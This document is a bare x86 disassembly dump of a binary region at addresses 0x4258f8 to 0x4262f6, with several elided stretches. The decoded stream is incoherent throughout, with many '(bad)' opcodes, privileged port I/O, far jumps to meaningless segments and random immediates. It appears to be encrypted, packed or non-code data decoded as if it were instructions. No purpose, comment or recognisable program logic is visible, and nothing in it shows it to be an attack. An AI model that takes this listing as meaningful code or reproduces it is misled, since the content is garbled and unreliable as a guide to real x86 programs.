  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	sub    esi,esi
  425902:	std    
  425903:	jne    0x4258d1
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	cmp    eax,DWORD PTR [ecx+0x3924a6f5]
  425912:	inc    esp
  425913:	jp     0x4258d7
  425915:	in     al,0x6
  425917:	(bad)  
  425918:	dec    ebx
  425919:	daa    
  42591a:	sub    al,0x5f
  42591c:	sbb    ebx,esp
  42591e:	lods   al,BYTE PTR fs:[esi]
  425920:	mov    al,ds:0xc051d234
  425925:	pop    ebx
  425926:	mov    eax,ds:0xef6973da
  42592b:	repz retf 
  42592d:	rcl    edi,cl
  42592f:	xchg   esp,eax
  425930:	outs   dx,DWORD PTR ds:[esi]
  425931:	add    al,BYTE PTR [esi+eax*8+0x3f]
  425935:	mov    edx,eax
  425937:	rol    ch,0xce
  42593a:	icebp  
  42593b:	jmp    0x2476:0x87ff39f8
  425942:	imul   eax,DWORD PTR [edx],0xe089f17
  425948:	arpl   WORD PTR [ebp-0x3cb8f536],cx
  42594e:	inc    ebx
  42594f:	dec    esp
  425950:	aam    0x76
  425952:	sbb    eax,0x963be25e
  425957:	repnz mov cl,0x4b
  42595a:	xchg   edx,eax
  42595b:	ror    DWORD PTR [ecx-0x4a],1
  42595e:	in     eax,0x97
  425960:	repz xor eax,0x720a5d3f
  425966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425967:	push   ebp
  425968:	sbb    DWORD PTR [ebp+0x119e1d84],ebx
  42596e:	sahf   
  42596f:	mov    WORD PTR [esi+0x25b6afd8],cs
  425975:	xchg   ebx,eax
  425976:	sti    
  425977:	repz sub BYTE PTR ss:[edi],0x8c
  42597c:	fcomp  st(7)
  42597e:	fcomp  DWORD PTR [eax-0x51]
  425981:	ret    0xa94
  425984:	xchg   ebp,eax
  425985:	jmp    0x84b28e79
  42598a:	jecxz  0x4259b8
  42598c:	mov    ah,0xaa
  42598e:	mov    eax,ds:0x2308aee8
  425993:	dec    esp
  425994:	out    dx,eax
  425995:	xor    edx,DWORD PTR [edi+0x6276a5d5]
  42599b:	ja     0x425935
  42599d:	jnp    0x42596b
  42599f:	xor    ch,al
  4259a1:	in     al,dx
  4259a2:	leave  
  4259a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259a4:	pop    ecx
  4259a5:	stos   BYTE PTR es:[edi],al
  4259a6:	or     dh,BYTE PTR [ebp+edi*4-0x6e96b8ec]
  4259ad:	out    0xcd,eax
  4259af:	jo     0x42597e
  4259b1:	inc    ecx
  4259b2:	mov    dl,0x7a
  4259b4:	lods   eax,DWORD PTR ds:[esi]
  4259b5:	jns    0x4259fc
  4259b7:	adc    BYTE PTR [eax-0xa4145dc],dh
  4259bd:	arpl   bx,dx
  4259bf:	int    0x24
  4259c1:	pop    eax
  4259c2:	push   ebx
  4259c3:	adc    ch,BYTE PTR [ebx+esi*4-0x43966153]
  4259ca:	aad    0x3
  4259cc:	mov    bl,0x94
  4259ce:	push   0xe
  4259d0:	shr    BYTE PTR [eax-0x59],cl
  4259d3:	add    DWORD PTR [esi+0x39],ebp
  4259d6:	imul   eax,DWORD PTR ds:[ecx-0x79],0xffffff8e
  4259db:	retf   
  4259dc:	gs pop edi
  4259de:	dec    ebx
  4259df:	aam    0xde
  4259e1:	mov    ecx,0xb3112edb
  4259e6:	mov    ds:0x25e9a8f2,eax
  4259eb:	daa    
  4259ec:	retf   0x3477
  4259ef:	sbb    BYTE PTR [ebx],ch
  4259f1:	pop    ds
  4259f2:	outs   dx,BYTE PTR ds:[esi]
  4259f3:	mov    eax,eax
  4259f5:	sahf   
  4259f6:	jo     0x42599d
  4259f8:	test   eax,0xa5c9527a
  4259fd:	into   
  4259fe:	or     DWORD PTR [edi-0x14d935b2],edi
  425a04:	lock mov al,ds:0xf127acfe
  425a0a:	ror    DWORD PTR ds:0xed3b02c,cl
	...
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x29605862]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	shl    DWORD PTR [ecx-0x7b6b959c],cl
  425a92:	mov    ebx,0xfc5f22b3
  425a97:	lea    edi,[ebp-0x6f]
  425a9a:	pop    ds
  425a9b:	cs loope 0x425afa
  425a9e:	inc    esi
  425a9f:	adc    eax,0xb25b6aad
  425aa4:	adc    BYTE PTR [ebx-0x56],dh
  425aa7:	test   ah,cl
  425aa9:	inc    edx
  425aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425aab:	hlt    
  425aac:	mov    esp,0x500919a4
  425ab1:	cs stc 
  425ab3:	call   0x8d1d:0xfd482fbd
  425aba:	jg     0x425acc
  425abc:	shr    DWORD PTR [ebp-0x4],1
  425abf:	xchg   esi,eax
  425ac0:	cwde   
  425ac1:	push   ebx
  425ac2:	sub    eax,0xc38358e
  425ac7:	ret    0xa656
  425aca:	xchg   cl,cl
  425acc:	cmc    
  425acd:	mov    dh,BYTE PTR [esi+0x5fb836e5]
  425ad3:	push   ds
  425ad4:	sub    ch,BYTE PTR [ebx]
  425ad6:	fild   WORD PTR [eax-0x1579cbb9]
  425adc:	cmp    BYTE PTR [esi],ah
  425ade:	aam    0x8f
  425ae0:	outs   dx,BYTE PTR ds:[esi]
  425ae1:	pop    ss
  425ae2:	aas    
  425ae3:	and    ch,0xcb
  425ae6:	mov    dl,0xff
  425ae8:	cmc    
  425ae9:	cld    
  425aea:	pop    ebp
  425aeb:	or     al,BYTE PTR [ebx]
  425aed:	xor    dh,BYTE PTR [ebx-0x60639382]
  425af3:	mov    esi,0x6016ddd7
  425af8:	addr16 sbb esi,esp
  425afb:	sar    DWORD PTR [ecx-0x4efcc3ca],cl
  425b01:	pop    es
  425b02:	or     ah,bl
  425b04:	cld    
  425b05:	pushf  
  425b06:	stc    
  425b07:	mov    ecx,0x3bf9c01
  425b0c:	adc    edx,DWORD PTR [eax-0x67]
  425b0f:	push   cs
  425b10:	aad    0xe3
  425b12:	sti    
  425b13:	and    al,0xa8
  425b15:	add    ah,BYTE PTR [edx+0x79]
  425b18:	dec    esi
  425b19:	xchg   esp,eax
  425b1a:	ins    DWORD PTR es:[edi],dx
  425b1b:	jle    0x425b2e
  425b1d:	ret    0x918b
  425b20:	jg     0x425b19
  425b22:	dec    eax
  425b23:	adc    eax,0x29edb1ad
  425b28:	xchg   ebp,eax
  425b29:	lock ret 
  425b2b:	daa    
  425b2c:	div    bl
  425b2e:	cld    
  425b2f:	jg     0x425ae6
  425b31:	jmp    0x40738aef
  425b36:	sbb    DWORD PTR ds:0x6a050e04,eax
  425b3c:	aas    
  425b3d:	pop    ss
  425b3e:	nop
  425b3f:	gs sub esi,eax
  425b42:	and    ebp,ebx
  425b44:	retf   
  425b45:	pop    es
  425b46:	jge    0x425b56
  425b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b49:	cmp    ebp,DWORD PTR [ebx+ebp*4+0x2a1ec690]
  425b50:	std    
  425b51:	test   eax,0x8d52632c
  425b56:	mov    esi,0xe19da335
  425b5b:	cmp    al,0x1f
  425b5d:	mov    ebx,0xb0756f3a
  425b62:	std    
  425b63:	cmp    edx,esi
  425b65:	test   al,0x2d
  425b67:	pop    edi
  425b68:	jb     0x425b29
  425b6a:	sbb    DWORD PTR [edi+0x1205b305],edi
  425b70:	test   bh,0x10
  425b73:	neg    DWORD PTR [edx]
  425b75:	cld    
  425b76:	sti    
  425b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b78:	ins    DWORD PTR es:[edi],dx
  425b79:	lds    ecx,FWORD PTR [ecx-0x7e2e5512]
  425b7f:	cwde   
  425b80:	and    esp,eax
  425b82:	(bad)  
  425b83:	(bad)  
  425b85:	xchg   bh,dl
  425b87:	push   0xaaf2545c
  425b8c:	lea    eax,[ecx+0xfa73]
	...
  425bf2:	add    BYTE PTR [eax],al
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	inc    edi
  425c01:	dec    ebx
  425c02:	(bad)  
  425c03:	in     eax,0xd4
  425c05:	xchg   edx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	xchg   edi,eax
  425c0d:	sub    eax,0xd9e2c9b7
  425c12:	dec    ebx
  425c13:	cmp    BYTE PTR [edi+eax*8+0x14],dl
  425c17:	xchg   ebp,eax
  425c18:	jl     0x425c48
  425c1a:	mov    ch,cl
  425c1c:	enter  0x2b7d,0x44
  425c20:	dec    ebp
  425c21:	jmp    0x40453791
  425c26:	xchg   ebx,eax
  425c27:	cpuid  
  425c29:	nop
  425c2a:	arpl   bp,di
  425c2c:	les    ebx,FWORD PTR [ecx-0x5e]
  425c2f:	in     al,0x1f
  425c31:	dec    esp
  425c32:	inc    edx
  425c33:	push   eax
  425c34:	jne    0x425c56
  425c36:	push   cs
  425c37:	dec    eax
  425c38:	nop
  425c39:	call   0x1520:0x7c8ef069
  425c40:	mov    al,0x3f
  425c42:	gs push edi
  425c44:	sbb    BYTE PTR [eax],0x42
  425c47:	mov    ebx,0xa8aad037
  425c4c:	sti    
  425c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c4e:	pop    ebx
  425c4f:	pop    ss
  425c50:	sbb    cl,BYTE PTR [edx]
  425c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c53:	dec    esi
  425c54:	jo     0x425ca3
  425c56:	popa   
  425c57:	call   FWORD PTR [ecx+0x54cff960]
  425c5d:	push   ebp
  425c5e:	ret    0xf36
  425c61:	call   FWORD PTR [ebx+0x11362dd]
  425c67:	sbb    DWORD PTR [ebx-0x5c],eax
  425c6a:	xchg   ebp,eax
  425c6b:	mov    al,0x9a
  425c6d:	rcr    BYTE PTR [edx-0xa48b110],1
  425c73:	mov    eax,0xbf346127
  425c78:	add    BYTE PTR [ebx-0x27],0x73
  425c7c:	or     ecx,DWORD PTR [edi-0x580d007a]
  425c82:	js     0x425c7a
  425c84:	int    0x60
  425c86:	aaa    
  425c87:	popa   
  425c88:	cli    
  425c89:	mov    dl,0xc9
  425c8b:	arpl   WORD PTR [esi],dx
  425c8d:	repz sbb al,0x82
  425c90:	inc    edi
  425c91:	mov    edi,0xbd37e73d
  425c96:	enter  0xe442,0x95
  425c9a:	(bad)  
  425c9b:	xchg   ebx,eax
  425c9c:	sub    bl,BYTE PTR [ebp-0x2a]
  425c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ca0:	es mov bh,0x56
  425ca3:	jmp    0xf313271d
  425ca8:	jge    0x425d09
  425caa:	xchg   DWORD PTR [ecx+ebp*4],ebx
  425cad:	icebp  
  425cae:	div    bh
  425cb0:	mov    ebp,0xd5221d4d
  425cb5:	jno    0x425d08
  425cb7:	push   ds
  425cb8:	dec    DWORD PTR [ebp-0xf]
  425cbb:	cmp    DWORD PTR [ebp+0x379e0a78],ecx
  425cc1:	frstor [eax+0x1a]
  425cc4:	leave  
  425cc5:	mov    ebp,0x65ebbe0
  425cca:	dec    esi
  425ccb:	out    0x85,al
  425ccd:	imul   eax,DWORD PTR [eax-0x32],0x6a400a01
  425cd4:	mov    cx,0x615c
  425cd8:	stos   DWORD PTR es:[edi],eax
  425cd9:	ins    DWORD PTR es:[edi],dx
  425cda:	stc    
  425cdb:	lahf   
  425cdc:	(bad)  
  425cdd:	cmp    DWORD PTR [edi],ebx
  425cdf:	adc    BYTE PTR [esi],dl
  425ce1:	jg     0x425d1b
  425ce3:	shl    edi,1
  425ce5:	push   0xffffff94
  425ce7:	xor    BYTE PTR [eax],ah
  425ce9:	cli    
  425cea:	xor    eax,0xc5d9ff4e
  425cef:	ret    
  425cf0:	mov    ebx,DWORD PTR [eax]
  425cf2:	pop    edx
  425cf3:	mov    fs,WORD PTR [edx+0x0]
  425cf6:	jecxz  0x425ce5
  425cf8:	inc    eax
  425cf9:	dec    edi
  425cfa:	pushf  
  425cfb:	shl    DWORD PTR [ecx],1
  425cfd:	ret    0x667
  425d00:	push   ebp
  425d01:	push   ss
  425d02:	cli    
  425d03:	push   ds
  425d04:	mov    esp,0x88b25338
  425d09:	pop    ebx
  425d0a:	mov    edi,0x7b3afc46
  425d0f:	xor    al,0x0
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xfeae1475,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	xchg   DWORD PTR [ebp-0x6d6cfe56],ebx
  425d92:	rol    bh,1
  425d94:	fwait
  425d95:	fs nop
  425d97:	sbb    BYTE PTR [ebp-0x36],bl
  425d9a:	and    al,0xf
  425d9c:	nop
  425d9d:	mov    al,ds:0x43ab2c6b
  425da2:	cwde   
  425da3:	ror    ah,cl
  425da5:	js     0x425d2e
  425da7:	inc    esi
  425da8:	jecxz  0x425d85
  425daa:	sub    bh,BYTE PTR [edx+0x69]
  425dad:	jl     0x425d89
  425daf:	xor    esi,ecx
  425db1:	repz addr16 xchg ebx,eax
  425db4:	dec    BYTE PTR [edx]
  425db6:	mov    ebx,0xae2f6bab
  425dbb:	xchg   esp,eax
  425dbc:	or     edi,DWORD PTR [esi+esi*4-0x61]
  425dc0:	xchg   esp,eax
  425dc1:	or     eax,0x2f8738b4
  425dc6:	xchg   esi,eax
  425dc7:	fsubr  DWORD PTR [eax+0x20]
  425dca:	sar    DWORD PTR [ebx-0xac817ff],1
  425dd0:	sti    
  425dd1:	push   es
  425dd2:	mov    BYTE PTR [eax-0x5a],0xbe
  425dd6:	mov    bh,0x85
  425dd8:	je     0x425e2b
  425dda:	int3   
  425ddb:	inc    ecx
  425ddc:	aas    
  425ddd:	xchg   DWORD PTR [ecx],ecx
  425ddf:	test   BYTE PTR [eax+0x1],al
  425de2:	jae    0x425d72
  425de4:	sti    
  425de5:	dec    eax
  425de6:	dec    edx
  425de7:	cmp    ah,ch
  425de9:	ret    0xd268
  425dec:	or     DWORD PTR [ecx-0x41],ebp
  425def:	aaa    
  425df0:	inc    ecx
  425df1:	or     eax,0xae659ae6
  425df6:	es clc 
  425df8:	fmulp  st(4),st
  425dfa:	stos   DWORD PTR es:[edi],eax
  425dfb:	push   cs
  425dfc:	ror    al,1
  425dfe:	in     eax,dx
  425dff:	cli    
  425e00:	dec    ebp
  425e01:	dec    edx
  425e02:	jns    0x425e22
  425e04:	pop    eax
  425e05:	(bad)  
  425e06:	iret   
  425e07:	or     eax,0x21defec5
  425e0c:	sahf   
  425e0d:	inc    ebx
  425e0e:	mov    edi,DWORD PTR [edi]
  425e10:	lock add eax,0xf06951c6
  425e16:	mov    edx,0x1650db5b
  425e1b:	(bad)  
  425e1c:	loope  0x425dce
  425e1e:	mov    al,ds:0xa498ed15
  425e23:	and    eax,0xb0d2a68c
  425e28:	inc    esi
  425e29:	out    0xbe,eax
  425e2b:	in     al,0x5e
  425e2d:	add    eax,0x9207cf8b
  425e32:	fwait
  425e33:	xchg   DWORD PTR [edx+ebp*8-0x7b3e7215],edi
  425e3a:	push   esi
  425e3b:	add    BYTE PTR [edx+0x45],0x61
  425e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e40:	clc    
  425e41:	scas   al,BYTE PTR es:[edi]
  425e42:	test   DWORD PTR ds:0xeb192358,esp
  425e48:	mov    ch,0xc4
  425e4a:	ss mov ebp,0x1e755474
  425e50:	lds    ecx,FWORD PTR [esi-0x71fc3f63]
  425e56:	xchg   esp,eax
  425e57:	mov    ds:0x1effc7d7,al
  425e5c:	int    0xd8
  425e5e:	cmc    
  425e5f:	rcl    DWORD PTR [ecx+0x17],1
  425e62:	and    eax,0xe1e23c7b
  425e67:	xor    DWORD PTR [eax-0x23],ebx
  425e6a:	dec    eax
  425e6b:	out    0xb9,al
  425e6d:	les    esp,FWORD PTR [edi+esi*8-0x2db943bd]
  425e74:	cmp    al,0x36
  425e76:	xor    eax,0x6e7245
  425e7b:	pushf  
  425e7c:	push   ebp
  425e7d:	loop   0x425e99
  425e7f:	xchg   BYTE PTR [ebx],ch
  425e81:	aaa    
  425e82:	frstor [edi+0x3a3a6529]
  425e88:	fidiv  WORD PTR [ecx]
  425e8a:	mov    bh,0x76
  425e8c:	es cdq 
  425e8e:	mov    ebp,0x21
	...
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	ins    DWORD PTR es:[edi],dx
  425f01:	lods   eax,DWORD PTR ds:[esi]
  425f02:	push   ss
  425f03:	call   0x104:0x194dc
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	in     eax,0xf6
  425f0e:	dec    edi
  425f0f:	pop    ebp
  425f10:	movlhps xmm4,xmm7
  425f13:	inc    esp
  425f14:	pusha  
  425f15:	dec    edx
  425f16:	popa   
  425f17:	out    0x6,al
  425f19:	dec    edx
  425f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f1b:	adc    eax,0x6b0f62d6
  425f20:	cmp    eax,0x80ccdadd
  425f25:	cli    
  425f26:	aaa    
  425f27:	loopne 0x425f59
  425f29:	pushf  
  425f2a:	lock enter 0x9d39,0x96
  425f2f:	lock jmp 0xa7dcead2
  425f35:	mov    ch,0x50
  425f37:	adc    al,bl
  425f39:	add    DWORD PTR [edi-0x493102d7],eax
  425f3f:	mov    eax,DWORD PTR [eax]
  425f41:	nop
  425f42:	(bad)  
  425f43:	push   ds
  425f44:	sub    esi,eax
  425f46:	loopne 0x425f73
  425f48:	jl     0x425ee7
  425f4a:	out    dx,al
  425f4b:	push   0x48
  425f4d:	shl    DWORD PTR [ecx-0x7a8c1ecd],cl
  425f53:	xchg   edi,eax
  425f54:	das    
  425f55:	sub    eax,0xf2cf943a
  425f5a:	push   ebx
  425f5b:	ror    BYTE PTR [eax-0x46],0xbc
  425f5f:	scas   eax,DWORD PTR es:[edi]
  425f60:	ss aas 
  425f62:	mov    ch,0xc6
  425f64:	pop    ebp
  425f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f66:	add    al,BYTE PTR [edi+0x7e]
  425f69:	sub    ebp,esp
  425f6b:	sti    
  425f6c:	cmp    dl,BYTE PTR [esi]
  425f6e:	in     eax,0xf6
  425f70:	jno    0x425f61
  425f72:	inc    ecx
  425f73:	add    ch,ah
  425f75:	xchg   ebx,eax
  425f76:	call   0x5b7e9642
  425f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f7c:	retf   0x5262
  425f7f:	retf   
  425f80:	sub    BYTE PTR [eax-0x22],al
  425f83:	in     eax,0x6a
  425f85:	push   es
  425f86:	into   
  425f87:	(bad)  [ebp+edi*2+0x5d]
  425f8b:	mov    dh,0x74
  425f8d:	in     al,dx
  425f8e:	out    dx,al
  425f8f:	into   
  425f90:	hlt    
  425f91:	lods   al,BYTE PTR ds:[esi]
  425f92:	ret    0xb1ec
  425f95:	xchg   ebx,eax
  425f96:	fs xor bh,cl
  425f99:	pop    es
  425f9a:	and    cl,BYTE PTR [ebp+0x27]
  425f9d:	(bad)  
  425f9e:	pop    ss
  425f9f:	mov    al,ds:0x672d8af6
  425fa4:	shl    DWORD PTR [ebp-0x3d97569],0x9d
  425fab:	mov    WORD PTR [eax-0xf],cs
  425fae:	aas    
  425faf:	sbb    DWORD PTR [edx-0xa2c3b3a],eax
  425fb5:	lahf   
  425fb6:	or     al,BYTE PTR [ebx]
  425fb8:	inc    esp
  425fb9:	cli    
  425fba:	adc    eax,0x2af73ca3
  425fbf:	test   al,0x49
  425fc1:	gs rcr dl,1
  425fc4:	push   ecx
  425fc5:	push   esi
  425fc6:	popa   
  425fc7:	adc    DWORD PTR [edi+0x5646c837],0x8693ffb2
  425fd1:	adc    ch,0x93
  425fd4:	fimul  WORD PTR ds:0xcab80b0c
  425fda:	dec    ebp
  425fdb:	mov    edx,0xd9cd0bff
  425fe0:	rol    DWORD PTR [edi],0xec
  425fe3:	cmp    esi,DWORD PTR [eax+0x74d07b12]
  425fe9:	fldenv ds:0xf76b00b3
  425fef:	in     eax,dx
  425ff0:	and    ebx,DWORD PTR [ebx+0x15b890d4]
  425ff6:	mov    bl,0xb5
  425ff8:	daa    
  425ff9:	mov    eax,0xc738b729
  425ffe:	aam    0x8d
  426000:	mov    al,ds:0x4c67aa87
  426005:	jg     0x425fbf
  426007:	popf   
  426008:	retf   0x7cc3
  42600b:	and    ah,BYTE PTR [ecx+0x1ca122]
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	mov    cl,BYTE PTR [ecx]
  426082:	fisttp DWORD PTR [ebx-0x20]
  426085:	xchg   ebp,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	fist   DWORD PTR ds:0xdd564e01
  426092:	ror    DWORD PTR [eax*8+0xaeedd20],cl
  426099:	adc    DWORD PTR [ebx-0x64],0xe7803026
  4260a0:	ret    
  4260a1:	fwait
  4260a2:	dec    esp
  4260a3:	ret    
  4260a4:	sub    cl,ch
  4260a6:	out    0xb0,eax
  4260a8:	jnp    0x426113
  4260aa:	sbb    al,0x86
  4260ac:	ins    DWORD PTR es:[edi],dx
  4260ad:	mov    al,ds:0x99dfd841
  4260b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260b3:	push   edi
  4260b4:	dec    ebx
  4260b5:	ret    0x7215
  4260b8:	clc    
  4260b9:	xchg   edi,eax
  4260ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260bb:	cmp    al,0xcc
  4260bd:	or     eax,0x7d11d497
  4260c2:	jno    0x4260f7
  4260c4:	shl    DWORD PTR [edx+0x5c],1
  4260c7:	(bad)  
  4260c8:	pop    ecx
  4260c9:	or     edi,ebp
  4260cb:	add    dh,BYTE PTR [edx]
  4260cd:	test   al,0x53
  4260cf:	add    dh,BYTE PTR [ebp+0x2e]
  4260d2:	outs   dx,DWORD PTR fs:[esi]
  4260d4:	xchg   esp,edx
  4260d6:	loopne 0x426070
  4260d8:	add    ah,BYTE PTR [ecx]
  4260da:	jns    0x426140
  4260dc:	mov    eax,ds:0x6ada077d
  4260e1:	loopne 0x426126
  4260e3:	jne    0x4260f9
  4260e5:	inc    ecx
  4260e6:	retf   
  4260e7:	test   BYTE PTR [edx-0x8bcedb8],bl
  4260ed:	push   ecx
  4260ee:	sbb    eax,0xad9b8950
  4260f3:	pop    ds
  4260f4:	xchg   edi,eax
  4260f5:	std    
  4260f6:	int3   
  4260f7:	dec    ebp
  4260f8:	adc    DWORD PTR [esi+0x57],0x70d501c4
  4260ff:	pop    ecx
  426100:	fcomp  QWORD PTR [ebx+ebx*1+0x392911e8]
  426107:	add    bl,dh
  426109:	data16 jmp 0x42614a
  42610c:	es call 0xe4357de0
  426112:	xchg   esi,eax
  426113:	stos   BYTE PTR es:[edi],al
  426114:	push   esi
  426115:	out    dx,eax
  426116:	(bad)  
  426117:	adc    eax,0x18050385
  42611c:	fs push esi
  42611e:	leave  
  42611f:	push   0x2d3a00e6
  426124:	je     0x426180
  426126:	out    dx,al
  426127:	or     cl,BYTE PTR [eax-0x6a]
  42612a:	and    al,0x70
  42612c:	xchg   esp,eax
  42612d:	jo     0x426120
  42612f:	or     edi,DWORD PTR [ebx-0xc1ebefb]
  426135:	fs sbb eax,0x22b5d5b
  42613b:	dec    esp
  42613c:	stos   DWORD PTR es:[edi],eax
  42613d:	dec    DWORD PTR [esi]
  42613f:	ret    0xa9fc
  426142:	fadd   DWORD PTR ds:0xc5cbee6f
  426148:	pusha  
  426149:	call   0x4f72:0xdb783c9a
  426150:	int    0x68
  426152:	mov    dh,0xf8
  426154:	pop    es
  426155:	ja     0x426153
  426157:	das    
  426158:	adc    BYTE PTR [edx],ah
  42615a:	push   esp
  42615b:	sub    al,ch
  42615d:	xchg   esi,eax
  42615e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42615f:	lods   al,BYTE PTR cs:[esi]
  426161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426162:	dec    ecx
  426163:	enter  0xeab3,0x7b
  426167:	les    edx,FWORD PTR ds:0x7966b0a6
  42616d:	call   0x7fd205c8
  426172:	scas   eax,DWORD PTR es:[edi]
  426173:	cli    
  426174:	std    
  426175:	cmp    eax,0x6e1644e8
  42617a:	push   ebx
  42617b:	out    0x4f,al
  42617d:	and    al,0x3f
  42617f:	mov    esp,0xbb267bc8
  426184:	ja     0x426161
  426186:	xor    eax,0x5d34d9a4
  42618b:	jl     0x4261d0
  42618d:	jl     0x4261d1
  42618f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx-0x4e9c1cd9],0x0
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	fdiv   DWORD PTR [esi-0x3a]
  42620f:	aad    0x78
  426211:	add    edi,ecx
  426213:	mov    ch,0x82
  426215:	(bad)  
  426217:	push   esi
  426218:	jo     0x42623e
  42621a:	imul   ebp,DWORD PTR es:[ecx],0x75
  42621e:	ins    DWORD PTR es:[edi],dx
  42621f:	mov    ah,0xdc
  426221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426222:	sar    BYTE PTR [edx-0x37a1cb],1
  426228:	cli    
  426229:	push   eax
  42622a:	or     al,0x17
  42622c:	mov    bl,0xde
  42622e:	add    cl,BYTE PTR [ecx+0x377fee95]
  426234:	dec    ebp
  426235:	loopne 0x4261c0
  426237:	rol    DWORD PTR [edx-0x33],cl
  42623a:	fldcw  WORD PTR [edx]
  42623c:	rcl    BYTE PTR [edi+0x7d8b44d],0x5a
  426243:	jmp    0xcb517bdc
  426248:	in     al,dx
  426249:	pop    ss
  42624a:	pop    edi
  42624b:	adc    edx,edi
  42624d:	inc    esi
  42624e:	jae    0x426219
  426250:	xlat   BYTE PTR ds:[ebx]
  426251:	push   edx
  426252:	xchg   ecx,eax
  426253:	aam    0x69
  426255:	ss and eax,0xb3bb8ed8
  42625b:	add    edi,DWORD PTR [ebp+0x26]
  42625e:	jecxz  0x426209
  426260:	push   esi
  426261:	xchg   ebx,eax
  426262:	add    al,0x2d
  426264:	push   ss
  426265:	in     eax,dx
  426266:	jne    0x426212
  426268:	xchg   ebp,eax
  426269:	repz add al,BYTE PTR ds:0xc955aad5
  426270:	imul   esp,DWORD PTR [ecx-0xfe1eb4b],0x38
  426277:	loopne 0x426247
  426279:	mov    ebx,0xce540d10
  42627e:	aam    0xb5
  426280:	sti    
  426281:	dec    ecx
  426282:	dec    BYTE PTR [esi+0x59]
  426285:	(bad)  
  426287:	mov    ch,0x29
  426289:	mov    ds:0xfe872ec7,eax
  42628e:	imul   edx,ecx,0xc5ea9346
  426294:	stos   DWORD PTR es:[edi],eax
  426295:	outs   dx,DWORD PTR ds:[esi]
  426296:	pop    ecx
  426297:	rcl    esi,cl
  426299:	fidivr DWORD PTR [edi+eiz*8-0x74]
  42629d:	sub    DWORD PTR [ebp-0x16eb8170],edi
  4262a3:	push   ecx
  4262a4:	inc    esp
  4262a5:	out    dx,al
  4262a6:	xor    BYTE PTR [edx+0x390f93cb],bl
  4262ac:	sbb    al,0xe8
  4262ae:	in     al,dx
  4262af:	add    eax,0xd7b03edf
  4262b4:	pop    esp
  4262b5:	adc    DWORD PTR [eax],edi
  4262b7:	mov    eax,ds:0xf611e637
  4262bc:	mov    edx,0xafe8be3
  4262c1:	in     al,dx
  4262c2:	sub    eax,0xbe1c3f61
  4262c7:	nop
  4262c8:	jnp    0x4262bd
  4262ca:	ins    BYTE PTR es:[edi],dx
  4262cb:	ss mov esi,0xddb1444e
  4262d1:	mov    ebx,0x10a0932f
  4262d6:	out    0x13,eax
  4262d8:	jp     0x426289
  4262da:	jnp    0x4262a7
  4262dc:	push   esp
  4262dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262de:	jmp    0x4262f5
  4262e0:	or     al,0x66
  4262e2:	jecxz  0x4262a5
  4262e4:	mov    eax,ds:0xf9c28a44
  4262e9:	push   ss
  4262ea:	mov    bl,0xa0
  4262ec:	popa   
  4262ed:	lds    ebx,FWORD PTR [esi-0x5cd2fb3d]
  4262f3:	shl    BYTE PTR [eax],0xae
  4262f6:	fisubr DWORD PTR [esi]
